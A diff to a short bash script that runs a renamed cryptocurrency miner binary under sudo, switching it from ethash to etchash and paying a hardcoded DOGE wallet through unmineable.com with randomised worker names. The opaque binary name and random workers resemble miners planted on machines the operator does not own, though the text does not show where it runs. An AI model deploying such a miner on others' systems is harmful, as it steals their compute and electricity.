@@ -1,9 +1,9 @@
 #!/bin/bash
 
-POOL=ethash.unmineable.com:3333
+POOL=etchash.unmineable.com:3333
 
 WALLET=DOGE:DGXbJD5ZKCPNEK4MJCVbiBzh18fcAGH24M
 
 WORKER=$(echo $(shuf -i 1-999999999 -n 1)-FA)
 
-sudo ./kontol --algo ETHASH --pool $POOL --user $WALLET.$WORKER $@ --ethstratum ETHV1
+sudo ./kontol --algo ETCHASH --pool $POOL --user $WALLET.$WORKER $@ --ethstratum ETHV1
